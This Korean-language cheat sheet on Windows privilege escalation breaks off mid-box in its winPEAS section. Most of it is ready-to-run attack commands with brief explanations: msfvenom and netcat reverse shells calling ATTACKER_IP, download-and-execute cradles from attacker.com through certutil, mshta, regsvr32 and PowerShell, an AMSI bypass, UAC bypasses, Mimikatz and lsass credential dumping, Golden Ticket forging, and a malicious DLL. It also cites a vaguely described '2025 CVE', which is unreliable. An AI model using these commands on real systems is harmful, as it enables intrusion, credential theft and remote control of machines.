# Windows 권한 상승 치트시트

> 최종 업데이트: 2026-02-08
> 참고: LOLBAS, winPEAS, HackTricks, PayloadsAllTheThings 기반

---

## 목차

1. [초기 정찰](#초기-정찰)
2. [서비스 악용](#서비스-악용)
3. [토큰 조작](#토큰-조작)
4. [UAC 우회](#uac-우회)
5. [레지스트리 악용](#레지스트리-악용)
6. [스케줄 작업 악용](#스케줄-작업-악용)
7. [자격증명 수집](#자격증명-수집)
8. [DLL 하이재킹](#dll-하이재킹)
9. [Potato 공격 계열](#potato-공격-계열)
10. [LOLBAS 핵심 바이너리 10개](#lolbas-핵심-바이너리-10개)
11. [winPEAS 결과 읽는 법](#winpeas-결과-읽는-법)
12. [자동화 도구 비교](#자동화-도구-비교)

---

## 초기 정찰

### 답지: 시스템 정보 수집 명령어

```powershell
# 기본 시스템 정보
systeminfo                           # OS 버전, 패치 수준, 아키텍처
hostname
whoami                               # 현재 사용자
whoami /priv                         # 현재 사용자의 권한 (토큰 확인에 핵심!)
whoami /groups                       # 소속 그룹

# 사용자 및 그룹
net user                             # 사용자 목록
net user administrator               # 특정 사용자 상세 정보
net localgroup                       # 로컬 그룹 목록
net localgroup Administrators        # 관리자 그룹 멤버

# 네트워크 정보
ipconfig /all                        # 네트워크 인터페이스
netstat -ano                         # 열린 포트 + PID
route print                          # 라우팅 테이블
arp -a                               # ARP 테이블

# 프로세스 및 서비스
tasklist /svc                        # 실행 중인 프로세스 + 서비스
wmic service get name,pathname,startmode  # 서비스 경로 (Unquoted Path 확인!)
sc query state= all                  # 모든 서비스 상태

# 패치 수준 확인 (커널 익스플로잇 검색용)
wmic qfe get Caption,Description,HotFixID,InstalledOn
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# 설치된 소프트웨어
wmic product get name,version
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s

# 드라이브 정보
wmic logicaldisk get caption,description,providername

# PowerShell 실행 정책 확인
Get-ExecutionPolicy
Set-ExecutionPolicy Bypass -Scope Process  # 현재 세션만 우회
powershell -ep bypass                      # 실행 정책 우회하며 실행
```

### 해설: 왜 정찰이 중요한가

- `whoami /priv`는 **토큰 기반 공격** 가능 여부를 즉시 보여줌 (SeImpersonatePrivilege 등)
- `systeminfo`의 패치 수준으로 알려진 커널/서비스 익스플로잇 검색 가능
- `wmic service`의 Unquoted Service Path는 매우 흔한 권한 상승 벡터
- 내부 네트워크 서비스(netstat)가 추가 공격 포인트가 될 수 있음

---

## 서비스 악용

### 답지: 서비스 기반 권한 상승

#### Unquoted Service Path (인용되지 않은 서비스 경로)

```powershell
# 취약한 서비스 찾기
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"

# 또는 PowerShell
Get-WmiObject win32_service | Select-Object Name, PathName, StartMode |
  Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' }

# 취약한 예:
# PathName: C:\Program Files\Vulnerable App\Service Binary\service.exe
# 인용부호가 없고 경로에 공백이 포함됨!

# Windows의 파일 탐색 순서:
# 1. C:\Program.exe
# 2. C:\Program Files\Vulnerable.exe
# 3. C:\Program Files\Vulnerable App\Service.exe
# 4. C:\Program Files\Vulnerable App\Service Binary\service.exe

# 악용: 쓰기 가능한 경로에 악성 실행 파일 배치
# C:\Program Files\Vulnerable App\ 에 쓸 수 있는지 확인
icacls "C:\Program Files\Vulnerable App"
# BUILTIN\Users:(W) 또는 (M) -> 쓰기 가능!

# msfvenom으로 리버스 쉘 생성
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Service.exe

# 파일 배치
copy Service.exe "C:\Program Files\Vulnerable App\Service.exe"

# 서비스 재시작 (재시작 권한이 있는 경우)
sc stop VulnService
sc start VulnService
# 또는 시스템 재부팅 대기
```

#### 약한 서비스 권한 (Weak Service Permissions)

```powershell
# 서비스 권한 확인
accesschk.exe /accepteula -uwcqv "Users" *
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
# SERVICE_ALL_ACCESS 또는 SERVICE_CHANGE_CONFIG -> 악용 가능!

# 서비스 바이너리 경로 변경
sc config VulnService binpath="C:\temp\reverse_shell.exe"
sc config VulnService obj="LocalSystem"  # SYSTEM 권한으로 실행

# 서비스 재시작
sc stop VulnService
sc start VulnService
# -> SYSTEM 권한으로 리버스 쉘 실행!

# 또는 사용자를 관리자 그룹에 추가
sc config VulnService binpath="net localgroup administrators attacker /add"
sc stop VulnService && sc start VulnService
```

#### 쓰기 가능한 서비스 바이너리 (Weak File Permissions)

```powershell
# 서비스 바이너리의 권한 확인
icacls "C:\Program Files\VulnApp\service.exe"
# Everyone:(F) 또는 BUILTIN\Users:(M) -> 쓰기/수정 가능!

# 원본 백업 후 악성 바이너리로 교체
copy "C:\Program Files\VulnApp\service.exe" "C:\Program Files\VulnApp\service.exe.bak"
copy C:\temp\reverse_shell.exe "C:\Program Files\VulnApp\service.exe"

# 서비스 재시작
sc stop VulnService && sc start VulnService
```

### 해설: 왜 서비스 악용이 작동하는가

- **Unquoted Service Path**: Windows가 공백이 포함된 경로를 순차적으로 탐색. 인용부호가 없으면 중간 경로에 배치한 실행 파일이 먼저 실행됨
- **약한 서비스 권한**: 서비스 구성을 변경할 수 있으면, 바이너리 경로를 악성 파일로 교체 가능
- 대부분의 서비스는 **SYSTEM** 또는 **LocalService** 권한으로 실행되므로, 성공 시 최고 권한 획득

### 실습 포인트

- `accesschk.exe`로 서비스 권한을 체계적으로 확인
- 서비스 재시작 권한이 없으면 시스템 재부팅을 유도하거나 대기
- 반드시 원본 바이너리를 백업한 후 교체 (복구용)

---

## 토큰 조작

### 답지: Windows 토큰 기반 권한 상승

```powershell
# 현재 토큰/권한 확인
whoami /priv

# 핵심 권한 목록 (이 중 하나라도 있으면 권한 상승 가능)
# SeImpersonatePrivilege     -> Potato 공격 계열 (가장 흔함)
# SeAssignPrimaryTokenPrivilege -> Potato 공격 계열
# SeBackupPrivilege          -> 모든 파일 읽기 가능
# SeRestorePrivilege         -> 모든 파일 쓰기 가능
# SeTakeOwnershipPrivilege   -> 파일/레지스트리 소유권 탈취
# SeDebugPrivilege           -> 다른 프로세스 메모리 접근
# SeLoadDriverPrivilege      -> 커널 드라이버 로드 가능
```

#### SeImpersonatePrivilege 악용 (Potato 공격)

```powershell
# IIS, MSSQL, 서비스 계정에서 주로 발견

# JuicyPotato (Windows 10 1809 이전, Server 2019 이전)
JuicyPotato.exe -l 1337 -p C:\temp\reverse_shell.exe -t * -c {CLSID}

# PrintSpoofer (Windows 10, Server 2016/2019)
PrintSpoofer.exe -i -c cmd
# 또는
PrintSpoofer.exe -c "C:\temp\reverse_shell.exe"

# GodPotato (Windows 8 ~ 11, Server 2012 ~ 2022)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\temp\reverse_shell.exe"

# SweetPotato (범용)
SweetPotato.exe -e EfsRpc -p C:\temp\reverse_shell.exe
```

#### SeBackupPrivilege 악용

```powershell
# SAM과 SYSTEM 레지스트리 하이브 덤프
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# 오프라인에서 해시 추출
secretsdump.py -sam SAM -system SYSTEM LOCAL
# 또는
pypykatz registry --sam SAM --system SYSTEM

# NTDS.dit 복사 (도메인 컨트롤러인 경우)
# diskshadow 사용
set context persistent nowriters
add volume c: alias mydrive
create
expose %mydrive% x:
# x:\Windows\NTDS\ntds.dit 복사
```

#### SeDebugPrivilege 악용

```powershell
# lsass.exe 프로세스에서 자격증명 덤프
# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 또는 ProcDump
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# 오프라인에서:
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

#### 토큰 도용 (Token Impersonation)

```powershell
# Meterpreter에서
meterpreter> use incognito
meterpreter> list_tokens -u
# 사용 가능한 토큰 목록 확인
meterpreter> impersonate_token "NT AUTHORITY\SYSTEM"

# 또는 TokenPlayer
TokenPlayer.exe --impersonate --id <PID>
# PID = SYSTEM으로 실행 중인 프로세스의 ID
```

### 해설: 왜 토큰 조작이 작동하는가

- Windows의 **액세스 토큰**은 사용자의 보안 컨텍스트를 나타냄
- `SeImpersonatePrivilege`가 있으면 **다른 사용자의 토큰을 사용**할 수 있음
- IIS(웹 서버), MSSQL(데이터베이스) 서비스 계정은 기본적으로 이 권한을 가짐
- Potato 공격: SYSTEM 권한의 토큰을 강제로 획득하는 기법들의 총칭

### 실습 포인트

- `whoami /priv`에서 **Disabled** 상태여도 악용 가능 (프로세스가 활성화 가능)
- Potato 계열은 Windows 버전에 따라 다른 도구 사용
- SeBackupPrivilege는 직접 쉘을 얻지는 못하지만, SAM 해시 -> Pass the Hash로 연결

---

## UAC 우회

### 답지: UAC (User Account Control) 우회 기법

```powershell
# UAC 상태 확인
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
# EnableLUA = 1 (UAC 활성화)
# ConsentPromptBehaviorAdmin = 0 (프롬프트 없이 승격) -> UAC 우회 불필요
# ConsentPromptBehaviorAdmin = 5 (기본값, 동의 필요)

# 현재 토큰의 무결성 수준 확인
whoami /groups | findstr "Level"
# Medium Mandatory Level -> UAC에 의해 제한됨
# High Mandatory Level -> 이미 승격됨
```

#### 자동 승격(Auto-Elevate) 바이너리 악용

```powershell
# 1. fodhelper.exe 우회 (가장 안정적, Windows 10/11)
# fodhelper는 auto-elevate 속성이 있어 UAC 프롬프트 없이 관리자 권한으로 실행됨
# 레지스트리를 통해 실행할 명령을 지정

reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /f
fodhelper.exe
# -> 관리자 cmd.exe가 실행됨!

# 정리
reg delete "HKCU\Software\Classes\ms-settings" /f


# 2. eventvwr.exe 우회 (Windows 10)
reg add "HKCU\Software\Classes\mscfile\Shell\Open\command" /d "cmd.exe" /f
eventvwr.exe
# -> 관리자 cmd.exe 실행

# 정리
reg delete "HKCU\Software\Classes\mscfile" /f


# 3. sdclt.exe 우회 (Windows 10)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "cmd.exe" /f
sdclt.exe
# -> 관리자 cmd.exe 실행

# 정리
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f


# 4. computerdefaults.exe 우회 (Windows 10)
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "powershell.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /f
computerdefaults.exe


# 5. schtasks.exe를 이용한 UAC 우회 (CVE-2025 - 최신)
# 2025년 발견: 낮은 권한 사용자가 schtasks.exe로 관리자 그룹을 사칭 가능
schtasks /create /tn "BypassUAC" /tr "cmd.exe /c whoami > C:\temp\output.txt" /sc once /st 00:00 /ru "SYSTEM"
schtasks /run /tn "BypassUAC"
```

#### UACME 도구 사용

```powershell
# UACME: 60개 이상의 UAC 우회 방법을 포함한 도구
# https://github.com/hfiref0x/UACME

# 방법 번호로 실행
akagi64.exe 23 cmd.exe       # fodhelper 방법
akagi64.exe 33 cmd.exe       # sdclt 방법
akagi64.exe 61 cmd.exe       # 최신 방법
```

### 해설: 왜 UAC 우회가 작동하는가

- 특정 Windows 바이너리는 **자동 승격(auto-elevate)** 속성을 가짐
- 이 바이너리들이 레지스트리에서 실행할 프로그램 경로를 읽어오는데, 사용자가 **해당 레지스트리를 수정** 가능 (HKCU는 사용자 권한으로 수정 가능)
- 결과: 신뢰된 바이너리가 공격자가 지정한 프로그램을 관리자 권한으로 실행

### 실습 포인트

- UAC 우회는 **로컬 관리자 계정이지만 UAC에 의해 제한된 경우**에만 의미 있음
- 일반 사용자(관리자 그룹에 속하지 않음)에서는 UAC 우회가 불가
- fodhelper 방법이 가장 안정적이며 Windows Defender에 덜 탐지됨

---

## 레지스트리 악용

### 답지: 레지스트리 기반 권한 상승

#### AlwaysInstallElevated

```powershell
# 확인
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 둘 다 1이면 -> MSI 파일이 SYSTEM 권한으로 설치됨!

# 악성 MSI 생성
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi

# 실행
msiexec /quiet /qn /i evil.msi
# SYSTEM 권한으로 리버스 쉘!
```

#### AutoRun 프로그램

```powershell
# AutoRun 레지스트리 확인
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# AutoRun 프로그램의 바이너리에 쓰기 권한이 있는지 확인
icacls "C:\Program Files\AutoRunApp\app.exe"
# BUILTIN\Users:(F) -> 교체 가능!

# 악성 바이너리로 교체
copy C:\temp\reverse_shell.exe "C:\Program Files\AutoRunApp\app.exe"
# 관리자가 로그인하면 SYSTEM 권한으로 리버스 쉘 실행
```

#### 서비스 레지스트리 키 수정

```powershell
# 서비스의 레지스트리 키에 쓰기 권한이 있는지 확인
accesschk.exe /accepteula -uvwqk "HKLM\System\CurrentControlSet\Services\VulnService"
# KEY_ALL_ACCESS -> 수정 가능!

# ImagePath 변경
reg add "HKLM\System\CurrentControlSet\Services\VulnService" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\reverse_shell.exe" /f

# 서비스 재시작
sc stop VulnService && sc start VulnService
```

### 해설: 왜 레지스트리 악용이 작동하는가

- **AlwaysInstallElevated**: 그룹 정책이 MSI 설치를 항상 높은 권한으로 실행하도록 설정. 보안 인식 없이 편의를 위해 활성화하는 경우가 많음
- **AutoRun**: 시스템 부팅/로그인 시 자동 실행되는 프로그램의 바이너리를 교체
- **서비스 레지스트리**: 서비스의 실행 경로를 직접 변경하여 악성 코드 실행

---

## 스케줄 작업 악용

### 답지: Scheduled Tasks 악용

```powershell
# 스케줄 작업 목록
schtasks /query /fo LIST /v
# 또는 PowerShell
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}

# SYSTEM으로 실행되는 작업 찾기
schtasks /query /fo LIST /v | findstr /B /C:"Task Name" /C:"Run As User" /C:"Task To Run"
# Run As User: SYSTEM 인 작업에 주목

# 작업이 실행하는 스크립트/바이너리에 쓰기 권한 확인
icacls "C:\Scripts\scheduled_task.ps1"
# Everyone:(M) -> 수정 가능!

# 스크립트 내용 교체
echo 'Start-Process -FilePath "C:\temp\reverse_shell.exe"' > "C:\Scripts\scheduled_task.ps1"
# 다음 실행 시 SYSTEM 권한으로 리버스 쉘!

# 2025 CVE: schtasks.exe를 통한 권한 상승
# schtasks.exe는 사용자가 패스워드를 알고 있으면 해당 사용자 컨텍스트로 작업 생성 가능
# 낮은 권한 사용자가 관리자/SYSTEM 컨텍스트 작업 생성 가능한 취약점 발견
```

### 해설: 왜 스케줄 작업 악용이 작동하는가

- Linux의 cron과 동일한 원리: 높은 권한으로 실행되는 작업의 스크립트를 교체
- 작업의 실행 파일/스크립트에 대한 권한 검증이 부족한 경우 악용 가능

---

## 자격증명 수집

### 답지: Windows 자격증명 검색

```powershell
# 저장된 자격증명
cmdkey /list                          # 저장된 자격증명 목록
# 저장된 자격증명이 있으면:
runas /savecred /user:administrator cmd.exe

# SAM 해시 덤프 (관리자 필요)
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
# 오프라인: secretsdump.py -sam SAM -system SYSTEM LOCAL

# WiFi 패스워드
netsh wlan show profiles
netsh wlan show profile name="NetworkName" key=clear

# Unattend/Sysprep 파일
findstr /si "password" C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\unattend\unattend.xml C:\Windows\system32\sysprep.inf C:\Windows\system32\sysprep\sysprep.xml

# IIS 설정 파일 (웹 서버 자격증명)
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\inetpub\wwwroot\web.config

# PowerShell 히스토리
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# 또는
Get-Content (Get-PSReadlineOption).HistorySavePath

# Windows Credential Manager
rundll32.exe keymgr.dll, KRShowKeyMgr

# DPAPI로 보호된 자격증명 (Mimikatz)
mimikatz.exe "dpapi::chrome /in:%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"

# 패스워드 검색 (파일 시스템)
findstr /si "password" *.txt *.ini *.config *.xml *.ps1
dir /s /b *pass* *cred* *vnc* *.config

# 레지스트리에 저장된 패스워드
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultPassword"
reg query "HKLM\SOFTWARE\OpenSSH\Agent\Keys"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### Mimikatz 핵심 명령

```powershell
# 전체 메모리 덤프에서 자격증명 추출
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 출력 예시:
# Authentication Id : 0 ; 123456 (00000000:0001e240)
# Session           : Interactive from 1
# User Name         : Administrator
# Domain            : WORKGROUP
# Logon Server      : WIN-TARGET
# Logon Time        : 2025/01/01 12:00:00
# SID               : S-1-5-21-...
#   msv :
#    [00000003] Primary
#    * Username : Administrator
#    * Domain   : WORKGROUP
#    * NTLM     : a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4   <-- NTLM 해시!
#    * SHA1     : ...
#   wdigest :
#    * Username : Administrator
#    * Domain   : WORKGROUP
#    * Password : Password123!                          <-- 평문 패스워드!

# Pass the Hash (해시만으로 인증)
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:. /ntlm:HASH /run:cmd.exe"

# Kerberos 티켓 추출
mimikatz.exe "kerberos::list /export"

# Golden Ticket 생성 (도메인 환경)
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt"
```

### 해설: 왜 자격증명 수집이 효과적인가

- Windows는 성능을 위해 **메모리에 자격증명을 캐시**함
- 구 버전 Windows는 **WDigest**로 평문 패스워드를 메모리에 저장
- 많은 관리자가 **여러 시스템에 동일한 패스워드 사용** (Pass the Hash)
- 설치/배포 파일에 평문 패스워드가 남아 있는 경우가 많음

---

## DLL 하이재킹

### 답지: DLL Hijacking

```powershell
# DLL 검색 순서 (SafeDllSearchMode 활성화 시)
# 1. 실행 파일의 디렉토리
# 2. 시스템 디렉토리 (C:\Windows\System32)
# 3. 16비트 시스템 디렉토리
# 4. Windows 디렉토리 (C:\Windows)
# 5. 현재 작업 디렉토리
# 6. PATH 환경변수의 디렉토리

# 누락된 DLL 찾기 (Process Monitor 사용)
# Procmon 필터:
#   Result = NAME NOT FOUND
#   Path ends with .dll
# SYSTEM으로 실행되는 프로세스가 존재하지 않는 DLL을 검색하면 악용 가능!

# 악성 DLL 생성
# msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o hijack.dll

# 또는 C 코드로 직접 작성
# hijack.c:
# #include <windows.h>
# BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
#     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
#         system("cmd.exe /c net localgroup administrators attacker /add");
#     }
#     return TRUE;
# }
# 컴파일: x86_64-w64-mingw32-gcc hijack.c -shared -o hijack.dll

# DLL을 검색 경로에 배치
copy hijack.dll "C:\Program Files\VulnApp\missing.dll"
# 서비스/프로그램 재시작 시 악성 DLL 로드!

# PATH 디렉토리에 쓰기 권한이 있는 경우
# PATH의 각 디렉토리 권한 확인
for %A in ("%PATH:;=" "%") do icacls "%~A" 2>nul | findstr /i "(F) (M) (W)"
# 쓰기 가능한 PATH 디렉토리에 DLL 배치
```

### 해설: 왜 DLL 하이재킹이 작동하는가

- Windows는 DLL을 **순차적으로 여러 위치에서 검색**
- 프로그램이 찾으려는 DLL이 없거나, 검색 순서 상 앞선 경로에 쓰기 가능한 디렉토리가 있으면 악용 가능
- 서비스가 SYSTEM으로 실행되면, 로드된 악성 DLL도 SYSTEM 권한으로 실행

---

## Potato 공격 계열

### 답지: Potato 계열 공격 요약

```
Potato 공격 계열 진화:

Hot Potato (2016)
  -> NBNS 스푸핑 + WPAD + NTLM 릴레이
  -> 패치됨

Rotten Potato (2016)
  -> DCOM/RPC + NTLM 릴레이
  -> SeImpersonatePrivilege 필요

Juicy Potato (2018)
  -> Rotten Potato 개선, CLSID 선택 가능
  -> Windows 10 1809 이전, Server 2019 이전
  -> 패치 후 사용 불가

Rogue Potato (2020)
  -> 원격 RPC 서버를 이용한 토큰 도용
  -> Juicy Potato 패치 우회

Print Spoofer (2020)
  -> Named Pipe를 이용한 토큰 도용
  -> Windows 10, Server 2016/2019
  -> 매우 안정적

Sweet Potato (2021)
  -> 여러 방법을 통합 (EfsRpc, PrintSpoofer 등)
  -> 범용적

God Potato (2023)
  -> 새로운 방법, Windows 8~11, Server 2012~2022
  -> 매우 광범위한 호환성

Coerced Potato (2024)
  -> RPC 강제 인증을 이용
  -> 최신 Windows에서도 동작
```

#### 실전 사용 예시

```powershell
# 전제조건 확인
whoami /priv | findstr "SeImpersonate\|SeAssignPrimaryToken"
# 둘 중 하나라도 있으면 Potato 공격 가능

# 어떤 Potato를 사용할지 결정
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Windows 10 (최신) / Windows 11 / Server 2022
GodPotato.exe -cmd "cmd /c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"

# Windows 10 / Server 2016/2019
PrintSpoofer.exe -i -c "cmd /c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"

# 구 버전 (Windows 10 1809 이전)
JuicyPotato.exe -l 1337 -p C:\temp\nc.exe -a "ATTACKER_IP 4444 -e cmd.exe" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

### 해설: 왜 Potato 공격이 작동하는가

- Windows 서비스 계정(IIS, MSSQL 등)은 `SeImpersonatePrivilege`를 가짐
- 이 권한으로 **SYSTEM 토큰을 요청**하고 **해당 토큰으로 프로세스 생성** 가능
- 각 Potato 변형은 SYSTEM 토큰을 얻는 **다른 메커니즘**을 사용
- Microsoft가 하나를 패치하면 새로운 방법이 발견되는 패턴이 반복됨

---

## LOLBAS 핵심 바이너리 10개

> https://lolbas-project.github.io/ 에서 전체 목록 확인 가능

### 답지: 가장 자주 악용되는 Windows 바이너리

```powershell
# 1. certutil.exe (파일 다운로드, 인코딩)
# 파일 다운로드 (AV 우회에 자주 사용)
certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe
# Base64 디코딩
certutil.exe -decode encoded.txt decoded.exe
# 해시 계산
certutil.exe -hashfile file.exe MD5

# 2. mshta.exe (HTA 실행, 코드 실행)
# 원격 HTA 실행
mshta.exe http://attacker.com/evil.hta
# 인라인 VBScript
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd"", 0:close")
# 인라인 JavaScript
mshta.exe javascript:a=GetObject("script:http://attacker.com/evil.sct").Exec()

# 3. rundll32.exe (DLL 함수 실행)
# JavaScript 실행
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("cmd")
# 원격 DLL 로드
rundll32.exe \\attacker.com\share\evil.dll,EntryPoint

# 4. regsvr32.exe (COM 스크립트 실행)
# 원격 SCT 파일 실행 (AppLocker 우회)
regsvr32.exe /s /n /u /i:http://attacker.com/evil.sct scrobj.dll

# 5. msiexec.exe (MSI 패키지 설치)
# 원격 MSI 실행
msiexec /q /i http://attacker.com/evil.msi
# AlwaysInstallElevated와 결합하면 SYSTEM 권한으로 실행

# 6. bitsadmin.exe (백그라운드 파일 전송)
# 파일 다운로드
bitsadmin /transfer myJob /download /priority high http://attacker.com/payload.exe C:\temp\payload.exe
# 코드 실행
bitsadmin /create 1 & bitsadmin /addfile 1 http://attacker.com/evil.exe C:\temp\evil.exe & bitsadmin /SetNotifyCmdLine 1 C:\temp\evil.exe NUL & bitsadmin /resume 1

# 7. wmic.exe (WMI 명령 실행)
# 프로세스 생성
wmic process call create "cmd.exe /c C:\temp\payload.exe"
# 원격 XSL 실행
wmic os get /format:"http://attacker.com/evil.xsl"

# 8. powershell.exe (가장 강력한 LOLBAS)
# 다운로드 + 실행 (cradle)
powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
# Base64 인코딩된 명령
powershell.exe -enc <BASE64_ENCODED_COMMAND>
# AMSI 우회 (자주 변경됨)
powershell.exe -ep bypass -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"

# 9. cscript/wscript.exe (스크립트 실행)
# VBS 스크립트 실행
cscript.exe //nologo evil.vbs
# JS 스크립트 실행
wscript.exe //nologo evil.js
# 원격 스크립트
cscript.exe //nologo \\attacker.com\share\evil.vbs

# 10. schtasks.exe (스케줄 작업)
# SYSTEM으로 실행되는 작업 생성
schtasks /create /tn "Updater" /tr "C:\temp\payload.exe" /sc onlogon /ru SYSTEM
schtasks /run /tn "Updater"
# 다른 사용자 컨텍스트로 작업 생성 (2025 CVE)
schtasks /create /tn "Bypass" /tr "cmd.exe" /sc once /st 00:00 /ru "NT AUTHORITY\SYSTEM"
```

### LOLBAS 카테고리별 정리

```
다운로드:    certutil, bitsadmin, powershell
코드 실행:   mshta, rundll32, regsvr32, wmic, cscript
우회:        mshta (AppLocker), regsvr32 (AppLocker), rundll32
지속성:      schtasks, reg (AutoRun), wmic
수집:        powershell, certutil (해시), wmic (시스템 정보)
```

### 해설: 왜 LOLBAS가 위험한가

- 모든 바이너리가 **Microsoft 서명**이 되어 있어 안티바이러스가 기본적으로 신뢰
- **이미 시스템에 설치**되어 있으므로 추가 도구 업로드 불필요
- AppLocker 등의 애플리케이션 화이트리스트를 **우회** 가능
- 정상적인 시스템 관리 활동과 **구분하기 어려움** (탐지 회피)

### 실습 포인트

- `certutil`과 `powershell`은 파일 다운로드의 1순위 도구
- `regsvr32`는 AppLocker 우회에 가장 효과적
- LOLBAS를 사용할 때는 **AV/EDR 탐지 가능성** 항상 고려

---

## winPEAS 결과 읽는 법

### 답지: winPEAS 실행 및 분석

```powershell
# 다운로드
certutil.exe -urlcache -split -f https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe winpeas.exe

# 또는 PowerShell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')

# 실행
.\winpeas.exe | tee winpeas_output.txt

# 특정 모듈만 실행
.\winpeas.exe servicesinfo           # 서비스 정보만
.\winpeas.exe userinfo               # 사용자 정보만
.\winpeas.exe systeminfo             # 시스템 정보만
```

### 색상 코드 해석

```
 빨강 (RED):       거의 확실한 권한 상승 벡터 -> 즉시 확인!
 노랑 (YELLOW):    잠재적 취약점 -> 추가 조사 필요
 초록 (GREEN):     일반 정보
 청록 (CYAN):      추가 정보

 winPEAS는 linPEAS와 동일한 색상 체계를 사용
```

### winPEAS 출력 섹션별 분석 가이드

```
┌─────────────────────────────────────────────────────────┐
│ Section: System Information                              │
│ 확인 포인트:                                             │
│ - OS 버전 + 빌드 번호 -> 커널 익스플로잇 검색            │
│ - 설치된 패치(KB) -> 누락된 보안 패치 확인               │
│ - PowerShell 버전 -> AMSI 우회 방법 결정                 │
│ - .NET 버전 -> 사용 가능한 공격 도구 결정                │
│ - UAC 상태 -> 우회 필요 여부 결정                        │
└─────────────────────────────────────────────────────────┘
        ▼
┌─────────────────────────────────────────────────────────┐
│ Section: User/Group Information                          │
│ 확인 포인트:                                             │
│ - 현재 사용자의 권한 (Privileges) -> 토큰 공격 결정      │
│   SeImpersonatePrivilege -> Potato 공격!                 │
│   SeBackupPrivilege -> SAM 덤프!                         │
│   SeDebugPrivilege -> Mimikatz!                          │
│ - 관리자 그룹 멤버 목록                                  │
│ - 저장된 자격증명 (cmdkey /list)                         │
│ - AutoLogon 설정 (레지스트리에 평문 패스워드)             │
└─────────────────────────────────────────────────────────┘
        ▼
┌─────────────────────────────────────────────────────────┐
│ Section: Services Information                            │
│ 확인 포인트:                                             │
│ - Unquoted Service Path (빨강 표시)                      │
│ - 쓰기 가능한 서비스 바이너리                             │
│ - 수정 가능한 서비스 구성                                 │
│ - Non-default 서비스에 주목 (커스텀 설치 소프트웨어)      │
└─────────────────────────────────────────────────────────┘
        ▼
┌─────────────────────────────────────────────────────────┐
│ Section: Applications Information                        │
│ 확인 포인트:                                             │
│ - 설치된 소프트웨어 버전 -> 알려진 취약점 검색            │
│ - AutoRun 프로그램 -> 바이너리 교체 가능 여부             │
│ - 스케줄 작업 -> SYSTEM으로 실행되는 작업                 │
└─────────────────────────────────────────────────────────┘
        ▼
┌─────────────────────────────────────────────────────────┐
│ Section: Network Information                             │
│ 확인 포인트:                                             │
│ - 내부 포트에서 실행 중인 서비스                          │
│ - 방화벽 규칙                                            │
│ - DNS 설정 (도메인 환경 힌트)                            │
│ - 네트워크 인터페이스 (피봇 포인트)                      │
└─────────────────────────────────────────────────────────┘
        ▼
┌─────────────────────────────────────────────────────────┐
│ Section: Interesting Files                               │
│ 확인 포인트:                                             │
